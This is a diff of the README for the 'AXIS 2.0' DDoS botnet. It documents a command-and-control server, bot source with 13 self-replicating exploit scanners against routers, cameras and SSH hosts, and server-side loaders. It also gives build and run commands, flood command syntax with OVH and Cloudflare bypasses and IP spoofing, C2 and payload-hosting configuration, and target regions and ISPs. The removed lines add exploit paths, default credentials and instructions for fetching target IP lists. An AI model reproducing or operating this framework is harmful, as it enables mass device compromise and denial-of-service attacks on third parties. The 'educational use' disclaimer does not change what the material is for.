@@ -1,6 +1,6 @@
-# AXIS 2.0 Botnet - Source Code
+# AXIS 2.0 Botnet - Complete DDoS Framework
 
-**DDoS botnet framework source code - Requires compilation**
+**Advanced DDoS botnet framework with self-replication, 12 attack methods, and 13 exploit scanners**
 
 ---
 
@@ -19,7 +19,7 @@ This is **SOURCE CODE ONLY** - not a finished product. You must:
 
 ### Build Environment
 - **OS**: Linux (Ubuntu/Debian/CentOS)
-- **Go**: 1.13+ (for C&C server)
+- **Go**: 1.21+ (for C&C server and extra scanners)
 - **GCC**: With cross-compilation toolchains (for bot binaries)
 - **MySQL/MariaDB**: Database server
 
@@ -33,32 +33,54 @@ This is **SOURCE CODE ONLY** - not a finished product. You must:
 ## 🎯 Features
 
 ### Core Capabilities
-- **13 Exploit Scanners** - Multiple infection vectors (bot self-replication)
-- **3 Server-Side Scanners** - External bot loaders (extrascanners/)
-- **10 Optimized Attack Methods** - Streamlined for maximum efficiency
+- **13 Exploit Scanners** - Bot self-replication via multiple infection vectors
+- **3 Server-Side Scanners** - External bot loaders (Go-based)
+- **12 Optimized Attack Methods** - Layer 4 and Layer 7 DDoS attacks
 - **Modern UI** - Cyan/white/yellow admin panel interface
 - **API Support** - REST API for remote control
 - **Database System** - User management, logging, whitelisting
 - **Encrypted Telnet** - TLS 1.2+ admin connections
 
-### Scanner Improvements (Bot Self-Replication)
-- **Rate-Limited** - Prevents crashes and network saturation
-- **Targeted IP Ranges** - Focused on vulnerable device concentrations by region (IllusionSec leaks)
-- **Global Coverage** - All regions: Asia, Europe, Americas, Africa, Middle East, Oceania
-- **Connection Throttling** - 500ms delay between connections
-- **Reduced Concurrent Connections** - 64 max per scanner
-- **Expanded Credentials** - 270+ username/password combinations (telnet scanner)
-- **Dual-Attack Zhone** - Unauthenticated RCE + authenticated brute-force (150+ creds)
-- **Merged GPON Scanners** - Single scanner handling ports 80 & 8080
-- **Full SSH Protocol** - Proper SSH handshake with 100+ credential pairs
-- **CIDR Support** - All scanners support subnet expansion (e.g., 192.168.0.0/16)
-- **URL Loading** - Server-side scanners can load targets from URLs
+### Attack Methods
 
-### Server-Side Scanners (extrascanners/)
+#### Layer 4 Attacks (9 methods)
+1. **TCP Flood** - Raw TCP SYN flood optimized for Gbps
+2. **UDP Flood** - Raw UDP flood optimized for Gbps
+3. **OVH TCP** - TCP with OVH Game bypass (SYN+ACK+PSH+URG)
+4. **OVH UDP** - UDP with OVH Game bypass (DNS-like headers)
+5. **ICMP** - ICMP Echo Request flood
+6. **AXIS-L4** - Combined OVHTCP + OVHUDP + ICMP
+7. **GRE IP** - GRE encapsulated IP flood
+8. **GRE ETH** - GRE encapsulated Ethernet flood
+9. **ULTIMATE L4** - All-in-one: TCP+UDP+ICMP+GRE-IP+GRE-ETH with IP spoofing
+
+#### Layer 7 Attacks (3 methods)
+10. **HTTP Flood** - HTTP GET/POST flood optimized for RPS
+11. **AXIS-L7** - Browser emulation + HTTPS + Cloudflare bypass
+12. **ULTIMATE L7** - Advanced multi-layer bypass (CF, Akamai, WAF) with session management
+
+### Scanner Arsenal (13 Self-Replication Scanners)
+
+| Scanner | Port | Exploit Type | Target |
+|---------|------|--------------|--------|
+| **Telnet** | 23 | Brute-force (270+ creds) | IoT devices, routers |
+| **SSH** | 22 | Brute-force (100+ creds) | Cloud providers, VPS |
+| **Huawei** | 37215 | SOAP RCE | Huawei ISP routers |
+| **Zyxel** | 8080 | Command injection | Zyxel SOHO routers |
+| **ThinkPHP** | 80 | RCE | ThinkPHP web apps |
+| **Realtek** | 52869 | UPnP RCE | Realtek chip routers |
+| **GPON** | 80/8080 | Command injection | FTTH/GPON ONT devices |
+| **Telnet Bypass** | 23 | Auth bypass (`-f root`) | IoT with auth bypass |
+| **DVR** | 80 | Command injection | CCTV/DVR cameras |
+| **Zhone** | 80 | Dual: unauth + auth brute-force | Zhone ONT/OLT |
+| **XiongMai** | 34599 | CVE-2017-16724 | XM IP cameras |
+| **Hilink** | 80 | Command injection | Hilink LTE routers |
+| **ASUS** | 80 | Command injection | ASUS RT-AC routers |
+
+### Server-Side Scanners (3 Go-Based Loaders)
 - **telnet-scanner** - Mass telnet brute-force with CIDR support
-- **0day-exploit** - 0-day exploit scanner for CF Rules targets
+- **0day-exploit** - Exploit scanner for CF Rules targets
 - **realtek-loader** - Realtek UPnP loader with URL/CIDR support
-- **run-all.sh** - Run all 3 scanners simultaneously
 
 ---
 
@@ -66,44 +88,54 @@ This is **SOURCE CODE ONLY** - not a finished product. You must:
 
 ```
 AXIS 2.0/
-├── cnc/                    # Command & Control server (Go source)
-│   ├── main.go            # Main server with TLS support
-│   ├── admin.go           # Admin panel handler
-│   ├── attack.go          # Attack parsing (10 methods)
-│   ├── bot.go             # Bot connection handling
-│   ├── clientList.go      # Bot management
-│   ├── database.go        # MySQL integration
-│   └── api.go             # REST API
-├── extrascanners/          # Server-side scanners (Go source) - NEW
-│   ├── telnet-scanner.go  # Mass telnet brute-force (IllusionSec .lst files)
-│   ├── 0day-exploit.go    # 0-day exploit scanner (CF Rules targets)
-│   ├── realtek-loader.go  # Realtek UPnP loader (realtek.lst)
-│   └── run-all.sh         # Run all 3 scanners simultaneously
-├── bot/                    # Bot source (C source)
-│   ├── main.c             # Main bot loop
-│   ├── attack.c/h         # Attack implementations (10 methods)
-│   ├── scanner.c/h        # Telnet brute-force (270+ credentials, rate-limited)
-│   ├── killer.c/h         # Anti-malware
-│   ├── huawei.c/h         # Huawei SOAP exploit (Africa, Middle East, Asia, LatAm)
-│   ├── zyxel.c/h          # Zyxel command injection (Europe, Asia, LatAm)
-│   ├── thinkphp.c/h       # ThinkPHP RCE (China, Southeast Asia)
-│   ├── realtek.c/h        # Realtek UPnP exploit (Asia, Eastern Europe, LatAm)
-│   ├── gpon_scanner.c/h   # GPON exploit merged (ports 80 & 8080)
-│   ├── telnetbypass.c/h   # Telnet auth bypass (IoT devices)
-│   ├── dvr.c/h            # DVR camera exploit (Asia, Middle East, Africa)
-│   ├── zhone.c/h          # Zhone ONT/OLT (unauthenticated + auth brute-force 150+ creds)
-│   ├── ssh.c/h            # SSH brute-force (cloud providers, VPS, proper protocol)
-│   ├── xm.c/h             # XiongMai camera exploit (CVE-2017-16724)
-│   ├── hilink.c/h         # Hilink LTE/4G router exploit
-│   ├── asus.c/h           # ASUS router exploit (RT-AC series)
-│   └── config.h           # Bot configuration (EDIT THIS)
-├── loader/                 # Telnet loader (C source)
-├── dlr/                    # Downloader (C source)
-├── build.sh                # Build script (all components)
-├── database.sql            # MySQL schema
-├── README.md               # This file
-├── QUICK_SETUP.txt         # Quick reference
-└── TROUBLESHOOTING.txt     # Troubleshooting guide
+├── cnc/                        # Command & Control server (Go)
+│   ├── main.go                # Main server with TLS support
+│   ├── admin.go               # Admin panel handler
+│   ├── attack.go              # Attack parsing (12 methods)
+│   ├── bot.go                 # Bot connection handling
+│   ├── clientList.go          # Bot management
+│   ├── database.go            # MySQL integration
+│   └── api.go                 # REST API
+├── extrascanners/              # Server-side scanners (Go)
+│   ├── telnet-scanner.go      # Mass telnet brute-force
+│   ├── 0day-exploit.go        # 0-day exploit scanner
+│   ├── realtek-loader.go      # Realtek UPnP loader
+│   └── run-all.sh             # Run all 3 simultaneously
+├── bot/                        # Bot source (C)
+│   ├── main.c                 # Main bot loop
+│   ├── attack.c/h             # Attack implementations (12 methods)
+│   ├── scanner.c/h            # Telnet brute-force scanner
+│   ├── killer.c/h             # Anti-malware killer
+│   ├── huawei.c/h             # Huawei SOAP exploit
+│   ├── zyxel.c/h              # Zyxel command injection
+│   ├── thinkphp.c/h           # ThinkPHP RCE
+│   ├── realtek.c/h            # Realtek UPnP exploit
+│   ├── gpon_scanner.c/h       # GPON exploit (ports 80 & 8080)
+│   ├── telnetbypass.c/h       # Telnet auth bypass
+│   ├── dvr.c/h                # DVR camera exploit
+│   ├── zhone.c/h              # Zhone ONT/OLT (dual attack)
+│   ├── ssh.c/h                # SSH brute-force
+│   ├── xm.c/h                 # XiongMai camera (CVE-2017-16724)
+│   ├── hilink.c/h             # Hilink LTE router exploit
+│   ├── asus.c/h               # ASUS router exploit
+│   └── config.h               # Bot configuration
+├── loader/                     # Telnet loader (C)
+│   ├── main.c                 # Main loader
+│   ├── server.c/h             # Server management
+│   ├── connection.c/h         # Connection handling
+│   ├── binary.c/h             # Binary payload handling
+│   └── telnet_info.c/h        # Telnet info parsing
+├── dlr/                        # Downloader (C)
+│   ├── main.c                 # Minimal ELF downloader
+│   └── dlr.h                  # Downloader config
+├── build.sh                    # Build script
+├── database.sql                # MySQL schema
+├── scanListen.go               # Scan result listener
+├── README.md                   # This file
+├── QUICK_SETUP.txt             # Quick reference
+├── TROUBLESHOOTING.txt         # Troubleshooting guide
+├── ULTIMATE_L4_README.md       # ULTIMATE L4 documentation
+└── ULTIMATE_L7_README.md       # ULTIMATE L7 documentation
 ```
 
 ---
@@ -165,77 +197,18 @@ chmod +x build.sh
 
 ### Extra Scanners (Server-Side Bot Loaders)
 
-These run on the C&C server to load bots directly (NOT self-replication on bots):
-
 ```bash
 # Build everything (includes extra scanners)
 ./build.sh
 
-# Option 1: Run all 3 scanners simultaneously (RECOMMENDED)
+# Run all 3 scanners simultaneously (RECOMMENDED)
 cd extrascanners
 ./run-all.sh YOUR_SERVER_IP 1000
 
-# Option 2: Run individual scanners
+# Or run individual scanners
 ./extrascanners/telnet-scanner leaks/10.lst 1000
-# Output: telnet_results.txt (IP:port user:pass)
-
 ./extrascanners/0day-exploit leaks/CF-Rules-1.txt YOUR_SERVER_IP 500
-# Output: 0day_results.txt (exploited targets)
-
 ./extrascanners/realtek-loader b4ckdoorarchive/RANDOM.LST/realtek.lst YOUR_SERVER_IP 1000
-# Output: realtek_results.txt (compromised devices)
-```
-
-**IP List Sources (download from GitHub):**
-```bash
-# Clone IllusionSec DDOS-archive
-git clone https://github.com/illusionsec/DDOS-archive.git
-cp -r DDOS-archive/leaks/* leaks/
-cp -r DDOS-archive/b4ckdoorarchive b4ckdoorarchive/
-```
-
-**Available IP Lists:**
-- `leaks/10.lst` through `leaks/49.lst` - Mass IP ranges (~2,000+ CIDR blocks each)
-- `leaks/CF-Rules-*.txt` - Cloudflare rule targets
-- `leaks/Firewall.txt` - Firewall rules with IP ranges
-- `b4ckdoorarchive/RANDOM.LST/realtek.lst` - Realtek devices (port 52869)
-
-**Supported File Formats:**
-```bash
-# Plain IPs
-1.2.3.4
-5.6.7.8
-
-# IP:Port format
-1.2.3.4:23
-5.6.7.8:80
-
-# CIDR notation / Subnets (automatically expanded)
-122.165.0.0/19
-1.2.3.0/24
-192.168.0.0/16
-
-# CIDR with custom port
-122.165.0.0/19:23
-1.2.3.0/24:80
-
-# Comments (lines starting with # are ignored)
-# This is a comment
-1.2.3.4
-
-# URL (load list from web)
-https://example.com/targets.txt
-```
-
-**Note:** CIDR blocks larger than /16 (65,536 IPs) are automatically skipped to prevent memory issues.
-
-**Feed Results to Loader:**
-```bash
-# Combine all results and feed to telnet loader
-cat telnet_results.txt 0day_results.txt realtek_results.txt | ./loader
-
-# Or add to permanent target list
-cat telnet_results.txt 0day_results.txt realtek_results.txt >> targets.txt
 ```
 
 ### Connect to Admin Panel
@@ -249,303 +222,238 @@ openssl s_client -connect YOUR_SERVER_IP:3777 -quiet
 
 ---
 
-## 🎯 Target Regions by Scanner
+## ⚔️ Attack Methods
 
-| Scanner | Asia | Europe | N. America | S. America | Africa | Middle East | Oceania |
-|---------|------|--------|------------|------------|--------|-------------|---------|
-| **Telnet (scanner.c)** | ✓ | ✓ | - | ✓ | ✓ | ✓ | ✓ |
-| **SSH** | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| **GPON (80/8080)** | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| **Huawei** | ✓ | ✓ | - | ✓ | ✓ | ✓ | ✓ |
-| **Zyxel** | ✓ | ✓ | ✓ | ✓ | - | ✓ | ✓ |
-| **ThinkPHP** | ✓ | ✓ | ✓ | - | - | - | ✓ |
-| **Realtek** | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| **DVR** | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| **Zhone** | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| **Telnet Bypass** | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| **XiongMai (XM)** | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| **Hilink** | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
-| **ASUS** | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
+### Layer 4 Attacks
 
-**Notes:**
-- SSH scanner uses proper SSH protocol handshake (not placeholder)
-- SSH targets cloud providers: AWS, DigitalOcean, Linode, Vultr, OVH, Hetzner
-- Zhone has dual attack vectors: unauthenticated RCE + authenticated brute-force
-- GPON scanner handles both ports 80 and 8080 in single binary
-- XiongMai exploits CVE-2017-16724 in IP cameras
-- Hilink targets LTE/4G mobile WiFi routers
-- ASUS targets RT-AC series routers with command injection
-
----
-
-## ⚔️ Attack Methods (10 Optimized Methods)
-
-### Volumetric Attacks
-
-#### 1. TCP Flood (Optimized for Gbps)
-**Command:** `!tcp <target> <duration>`
+#### 1. TCP Flood
+```bash
+!tcp <ip> <duration> len=1400 dport=80
+```
 - Raw TCP SYN flood
 - Optimized for maximum bandwidth (Gbps)
 - Configurable packet size (default: 1400 bytes)
-- Random source ports
-- Options: `len`, `sport`, `dport`, `source`
 
-**Example:**
+#### 2. UDP Flood
+```bash
+!udp <ip> <duration> len=1400 dport=53
 ```
-!tcp 1.2.3.4 300 len=1400 dport=80
-```
-
-#### 2. UDP Flood (Optimized for Gbps)
-**Command:** `!udp <target> <duration>`
 - Raw UDP flood
 - Optimized for maximum bandwidth (Gbps)
-- Configurable packet size (default: 1400 bytes)
 - Random payload generation
-- Options: `len`, `sport`, `dport`, `source`
-
-**Example:**
-```
-!udp 1.2.3.4 300 len=1400 dport=53
-```
 
 #### 3. OVH TCP Bypass
-**Command:** `!ovhtcp <target> <duration>`
+```bash
+!ovhtcp <ip> <duration> len=1400 dport=27015
+```
 - TCP flood with OVH Game bypass
 - SYN+ACK+PSH+URG flags set
-- Bypasses OVH TCP mitigation
-- Options: `len`, `sport`, `dport`, `source`
-
-**Example:**
-```
-!ovhtcp 1.2.3.4 300 len=1400 dport=27015
-```
 
 #### 4. OVH UDP Bypass
-**Command:** `!ovhudp <target> <duration>`
+```bash
+!ovhudp <ip> <duration> len=1400 dport=27015
+```
 - UDP flood with OVH Game bypass
 - DNS-like header to bypass filters
-- Bypasses OVH UDP mitigation
-- Options: `len`, `sport`, `dport`, `source`
-
-**Example:**
-```
-!ovhudp 1.2.3.4 300 len=1400 dport=27015
-```
 
 #### 5. ICMP Ping Flood
-**Command:** `!icmp <target> <duration>`
+```bash
+!icmp <ip> <duration> len=64
+```
 - ICMP Echo Request flood
 - No port needed (Layer 3)
-- Direct IP targeting
-- Options: `len`, `source`
 
-**Example:**
+#### 6. AXIS-L4 (Combined)
+```bash
+!axis-l4 <ip> <duration> len=1400 dport=80
 ```
-!icmp 1.2.3.4 300 len=64
-```
-
-#### 6. AXIS-L4 (Combined Attack)
-**Command:** `!axis-l4 <target> <duration>`
-- **Combined:** OVHTCP + OVHUDP + ICMP simultaneously
-- OVH TCP and UDP target specified port
-- ICMP targets IP directly (no port)
-- Maximum pressure attack
-- Options: `len`, `sport`, `dport`, `source`
-
-**Example:**
-```
-!axis-l4 1.2.3.4 300 len=1400 dport=80
-```
+- Combined: OVHTCP + OVHUDP + ICMP simultaneously
 
 #### 7. GRE IP Flood
-**Command:** `!greip <target> <duration>`
+```bash
+!greip <ip> <duration> dport=80
+```
 - GRE encapsulated IP flood
 - Bypasses some DDoS protection
-- Inner UDP payload
-- Options: `len`, `dport`, `source`
-
-**Example:**
-```
-!greip 1.2.3.4 300 dport=80
-```
 
 #### 8. GRE Ethernet Flood
-**Command:** `!greeth <target> <duration>`
+```bash
+!greeth <ip> <duration> dport=80
+```
 - GRE encapsulated Ethernet frame flood
-- Advanced bypass technique
-- Inner UDP payload
-- Options: `len`, `dport`, `source`
 
-**Example:**
+#### 9. ULTIMATE L4 (All-in-One)
+```bash
+!ultimate-l4 <ip> <duration> len=1400 dport=80
 ```
-!greeth 1.2.3.4 300 dport=80
-```
+- **Combined:** TCP + UDP + ICMP + GRE-IP + GRE-ETH
+- **Distribution:** 30% TCP, 30% UDP, 15% ICMP, 15% GRE-IP, 10% GRE-ETH
+- **IP Spoofing:** Generates spoofed source IPs from residential ranges
+- **Random TTL:** 32, 64, 128, 255 for filter evasion
+- **OVH Bypass:** TCP with special flags, UDP with DNS-like headers
+
+See `ULTIMATE_L4_README.md` for complete documentation.
 
 ### Layer 7 Attacks
 
-#### 9. HTTP Flood (Optimized for RPS)
-**Command:** `!http <URL> <duration>`
+#### 10. HTTP Flood
+```bash
+!http https://example.com/ 300 method=GET conns=100
+```
 - HTTP GET/POST flood
 - Optimized for maximum requests per second (RPS)
-- Supports custom methods, paths, user-agents
-- Options: `method`, `path`, `domain`, `useragent`, `conns`
 
-**Example:**
+#### 11. AXIS-L7
+```bash
+!axis-l7 https://target.com/ 300 domain=target.com
 ```
-!http http://example.com/ 300 method=GET conns=100
+- Browser emulation
+- HTTPS support
+- Cloudflare bypass
+- Cache bypass headers
+
+#### 12. ULTIMATE L7
+```bash
+!ultimate-l7 https://protected.site/ 300 domain=protected.site.com cookies="cf_clearance=TOKEN"
 ```
+- Advanced browser emulation (10 rotating user-agents)
+- Complete Sec-Fetch and Sec-Ch-Ua header suite
+- Header spoofing (X-Forwarded-For with spoofed IPs - no proxies)
+- Connection pooling with keep-alive
+- Session persistence via cookie extraction
+- Response analysis (CF, Akamai, rate limit detection)
+- Adaptive delays based on detection
+- Multi-method attack (GET/HEAD/POST weighted)
 
-#### 10. AXIS-L7 (Advanced Browser Emulation)
-**Command:** `!axis-l7 <URL> <duration>`
-- **Browser Emulation** - Full browser-like behavior
-- **HTTP/HTTPS Support** - Automatic protocol detection
-- **Cloudflare Bypass** - Solves JS challenge automatically
-- **Cache Bypass** - Random query strings, no-cache headers
-- **Captcha Bypass** - Advanced captcha solving
-- **Session Management** - Cookie handling
-- **Random Headers** - X-Forwarded-For, X-Real-IP, DNT
-- Options: `url`, `domain`, `useragent`, `cookies`, `referer`, `https`, `conns`
-
-**Examples:**
-```
-# HTTP target
-!axis-l7 http://example.com/ 300 conns=50
-
-# HTTPS target (auto-detected)
-!axis-l7 https://protected.example.com/ 300 conns=50
-
-# With custom cookies for CF bypass
-!axis-l7 https://target.com/ 300 cookies="cf_clearance=TOKEN"
-```
-
-**Cache Bypass Techniques:**
-- Random query parameters (`?cache_bust=random`)
-- `Cache-Control: no-cache, no-store, must-revalidate`
-- `Pragma: no-cache`
-- `Expires: 0`
-
-**Cloudflare Detection:**
-- Detects `cf-browser-verification`
-- Detects `__cf_chl` challenges
-- Detects "Checking your browser" pages
-- Detects captcha pages
-
-**Advanced Options:**
-- `cf_clearance` - Cloudflare clearance token
-- `cf_bm` - Cloudflare BM token
-- `cookies` - Custom cookies for session
-- `useragent` - Realistic browser user-agent
-- `https` - Force HTTPS (0 or 1)
+See `ULTIMATE_L7_README.md` for complete documentation.
 
 ---
 
-## 🔧 Scanner Optimizations
+## 📊 Attack Method Comparison
 
-### Changes Made
-1. **Reduced concurrent connections**: 256 → 64
-2. **Reduced packet rate**: 384 PPS → 32 PPS
-3. **Added connection delay**: 500ms between new connections
-4. **Reduced timeouts**: Faster cleanup of dead connections
-5. **Merged GPON scanners**: Single file for ports 80 & 8080
-6. **Expanded credentials**: 270+ username/password combinations
-7. **Zhone dual-attack**: Unauthenticated RCE + authenticated brute-force
-8. **Full SSH protocol**: Proper SSH handshake, not placeholder implementation
+| Method | Type | Vectors | IP Spoofing | Bypass | Notes |
+|--------|------|---------|-------------|--------|-------|
+| tcp | L4 | TCP | ❌ | ❌ | Basic TCP flood |
+| udp | L4 | UDP | ❌ | ❌ | Basic UDP flood |
+| ovhtcp | L4 | TCP | ❌ | ✅ | OVH TCP bypass |
+| ovhudp | L4 | UDP | ❌ | ✅ | OVH UDP bypass |
+| icmp | L4 | ICMP | ❌ | ❌ | Layer 3 attack |
+| axis-l4 | L4 | TCP+UDP+ICMP | ❌ | ✅ | Combined attack |
+| greip | L4 | GRE-IP | ✅ (inner) | ✅ | Encapsulation |
+| greeth | L4 | GRE-ETH | ✅ (inner) | ✅ | Triple encapsulation |
+| **ultimate-l4** | L4 | **ALL 5** | ✅ | ✅ | **All-in-one L4** |
+| http | L7 | HTTP | ❌ | ❌ | Basic HTTP flood |
+| axis-l7 | L7 | HTTP | ❌ | ✅ | Browser emulation |
+| **ultimate-l7** | L7 | HTTP | ✅ (headers) | ✅ | **Advanced L7** |
 
-### Scanner Technical Details
+---
 
-**Telnet Scanner (scanner.c)**
-- Credentials: 270+ username/password combinations
-- Rate limiting: 500ms delay, 64 max concurrent
-- Targets: IoT devices, routers, cameras with weak telnet
-- Regions: Asia, Latin America, Africa, Middle East, Europe, Oceania
+## 🌍 Scanner Target Regions
 
-**SSH Scanner (ssh.c)**
-- Credentials: 100+ usernames × 100+ passwords
-- Protocol: Full SSH-2.0 handshake implementation
-- KEXINIT key exchange support
-- Targets: Cloud providers, VPS hosts, servers
-- Regions: Global cloud provider coverage (AWS, DO, Linode, Vultr, OVH, Hetzner)
+| Scanner | Asia | Europe | N. America | S. America | Africa | Middle East | Oceania |
+|---------|------|--------|------------|------------|--------|-------------|---------|
+| Telnet | ✓ | ✓ | - | ✓ | ✓ | ✓ | ✓ |
+| SSH | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
+| GPON | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
+| Huawei | ✓ | ✓ | - | ✓ | ✓ | ✓ | ✓ |
+| Zyxel | ✓ | ✓ | ✓ | ✓ | - | ✓ | ✓ |
+| ThinkPHP | ✓ | ✓ | ✓ | - | - | - | ✓ |
+| Realtek | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
+| DVR | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
+| Zhone | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
+| SSH | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
+| XM | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
+| Hilink | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
+| ASUS | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
 
-**GPON Scanner (gpon_scanner.c)**
-- Ports: 80 and 8080 (merged into single scanner)
-- Exploit: /GponForm/diag_Form command injection
-- Targets: FTTH/GPON ONT devices
-- ISPs: Claro, Movistar, Viettel, BSNL, Airtel, STC, Etisalat
+**Notes:**
+- SSH scanner uses proper SSH protocol handshake
+- SSH targets cloud providers: AWS, DigitalOcean, Linode, Vultr, OVH, Hetzner
+- Zhone has dual attack: unauthenticated RCE + authenticated brute-force (150+ creds)
+- GPON handles both ports 80 and 8080 in single scanner
+- XiongMai exploits CVE-2017-16724 in IP cameras
 
-**Huawei Scanner (huawei.c)**
-- Exploit: SOAP DeviceUpgrade RCE
-- Port: 37215
-- Targets: Huawei ISP routers/ONTs
-- Regions: Africa, Middle East, Asia, Latin America
+---
 
-**Zyxel Scanner (zyxel.c)**
-- Exploit: /cgi-bin/ViewLog.asp command injection
-- Port: 8080
-- Targets: Zyxel SOHO/SMB routers
-- Regions: Europe, Asia, Latin America
+## 🔧 Configuration
 
-**ThinkPHP Scanner (thinkphp.c)**
-- Exploit: ThinkPHP RCE via index.php
-- Port: 80
-- Targets: ThinkPHP web applications
-- Regions: China, Southeast Asia, hosting providers
+### Bot Configuration (`bot/config.h`)
+```c
+#define CNC_ADDR "YOUR.SERVER.IP.HERE"
+#define CNC_PORT 3778
+#define SCAN_CB_PORT 9555
+#define HTTP_SERVER "YOUR.SERVER.IP.HERE"
+#define HTTP_PORT 80
 
-**Realtek Scanner (realtek.c)**
-- Exploit: UPnP AddPortMapping RCE
-- Port: 52869
-- Targets: SOHO routers with Realtek chips
-- Brands: TP-Link, D-Link, Tenda, Mercury, Totolink
+// Enable features
+#define KILLER      // Anti-malware
+#define SELFREP     // Self-replication scanners
+#define WATCHDOG    // Hardware watchdog
+```
 
-**DVR Scanner (dvr.c)**
-- Exploit: /cgi-bin/verify.cgi command injection
-- Port: 80
-- Targets: CCTV/DVR cameras
-- Regions: Asia, Middle East, Africa, Latin America
+### C&C Configuration (`cnc/main.go`)
+```go
+const DatabaseAddr string = "127.0.0.1:3306"
+const DatabaseUser string = "root"
+const DatabasePass string = "YOUR_PASSWORD"
+const DatabaseTable string = "AXIS2"
 
-**Zhone Scanner (zhone.c)**
-- Exploits: 
-  1. Unauthenticated: /cgi-bin/execute_cmd.cgi RCE
-  2. Authenticated: Login brute-force (150+ creds) + /cgi-bin/system_admin.cgi RCE
-- Targets: Zhone ONT/OLT devices
-- ISPs: Claro, Oi, Viettel, BSNL, Airtel
+const CNCListenAddr string = "0.0.0.0:3778"      // Bot connections
+const TelnetTLSListenAddr string = "0.0.0.0:3777" // Admin TLS
+const APIListenAddr string = "0.0.0.0:3779"       // REST API
+```
 
-**Telnet Bypass (telnetbypass.c)**
-- Exploit: USER="-f root" authentication bypass
-- Port: 23
-- Targets: IoT devices with telnet auth bypass vulnerability
+### Loader Configuration (`loader/config.h`)
+```c
+#define HTTP_SERVER "YOUR.SERVER.IP.HERE"
+#define HTTP_PORT 80
+#define TFTP_SERVER "YOUR.SERVER.IP.HERE"
+#define TFTP_PORT 69
+```
 
-**XiongMai Scanner (xm.c)**
-- Exploit: CVE-2017-16724 - XiongMai IP camera command injection
-- Port: 34599
-- Targets: XiongMai (XM) IP cameras and DVRs
-- Regions: Global (China, Asia, Europe, Americas)
+---
 
-**Hilink Scanner (hilink.c)**
-- Exploit: Hilink LTE/4G router command injection via /api/device/control
-- Port: 80
-- Targets: Hilink mobile WiFi routers (E5372, E5577, etc.)
-- Regions: Global (Europe, Asia, Africa, LatAm)
+## 📡 Ports
 
-### Credential Lists
+| Port | Service | Purpose |
+|------|---------|---------|
+| 22 | SSH | Admin access |
+| 80 | HTTP | Binary hosting |
+| 3777 | TLS Telnet | Admin panel (encrypted) |
+| 3778 | TCP | Bot connections |
+| 3779 | HTTP | REST API |
+| 9555 | TCP | Scan results listener |
+| 69 | UDP | TFTP server |
 
-**Telnet Scanner (scanner.c)**: 270+ credentials
-- Common defaults: root:root, admin:admin, admin:password
-- IoT defaults: vizxv, xc3511, hikvision, dahua
-- Vendor defaults: cisco, huawei, zte, netgear, tplink
-- Regional: china, brazil, india, vietnam, russia
-- Patterns: 123456, qwerty, password123, admin@123
+---
 
-**SSH Scanner (ssh.c)**: 100+ usernames × 100+ passwords
-- Usernames: root, admin, ubuntu, debian, centos, pi, oracle, etc.
-- Passwords: Common weak, vendor defaults, patterns, regional
-- Cloud-specific: ec2-user, vagrant, docker, ubuntu
+## 🗄️ Database Schema
 
-**Zhone Auth Brute-Force**: 150+ credentials
-- Common defaults: admin, root, password, 123456
-- Zhone specific: zhone, ont, gpon, fiber
-- Vendor defaults: zte, huawei, nokia, alcatel, calix
-- ISP common: isp, provider, telecom, carrier, network
-- FTTH specific: ftth, fttp, onu, ont, olt
+### Tables
+- **users** - User accounts, permissions, API keys
+- **history** - Attack history and logging
+- **whitelist** - Protected IP ranges
+- **logins** - Login attempt logs
+- **online** - Currently online users
+
+### Default Credentials
+```
+Username: admin
+Password: admin123  (CHANGE IMMEDIATELY!)
+API Key: AXIS2-ADMIN-APIKEY (CHANGE IMMEDIATELY!)
+```
+
+---
+
+## 📚 Documentation
+
+| File | Description |
+|------|-------------|
+| `README.md` | Main documentation (this file) |
+| `QUICK_SETUP.txt` | Quick installation guide |
+| `TROUBLESHOOTING.txt` | Comprehensive troubleshooting |
+| `ULTIMATE_L4_README.md` | ULTIMATE L4 attack documentation |
+| `ULTIMATE_L7_README.md` | ULTIMATE L7 attack documentation |
 
 ---
 
@@ -558,27 +466,6 @@ openssl s_client -connect YOUR_SERVER_IP:3777 -quiet
 - The authors are **NOT RESPONSIBLE** for misuse
 - Compliance with all applicable laws is **YOUR RESPONSIBILITY**
 
----
-
-## 📚 Documentation
-
-- **README.md** - This file (overview)
-- **QUICK_SETUP.txt** - Quick reference
-- **TROUBLESHOOTING.txt** - Troubleshooting guide
-- **ENCRYPTED_TELNET_GUIDE.md** - TLS telnet setup (if included)
-
----
-
-## 👥 Credits
-
-**Developed by AXIS Group**
-
----
-
-## 📜 License
-
-**Educational use only. All rights reserved.**
-
 By using this software, you agree to:
 - Use only for educational purposes
 - Comply with all applicable laws
@@ -587,4 +474,43 @@ By using this software, you agree to:
 
 ---
 
-**AXIS 2.0 - Source Code Release**
+## 👥 Credits
+
+**Developed by AXIS Group**
+
+**Version**: 2.0  
+**Release Date**: March 2026  
+**License**: Educational use only
+
+---
+
+## 📖 Quick Reference
+
+### Build Commands
+```bash
+./build.sh                    # Build everything
+./cnc_server                  # Start C&C
+./scanListen                  # Start scan listener
+./loader < ips.txt            # Start loader
+```
+
+### Admin Commands
+```bash
+help                          # Show help
+layer4                        # L4 attack methods
+layer7                        # L7 attack methods
+admin                         # Admin commands
+ports                         # Common ports
+```
+
+### Attack Examples
+```bash
+!tcp 1.2.3.4 300 dport=80
+!udp 1.2.3.4 300 dport=53
+!ultimate-l4 1.2.3.4 300 dport=80
+!ultimate-l7 https://target.com/ 300 domain=target.com
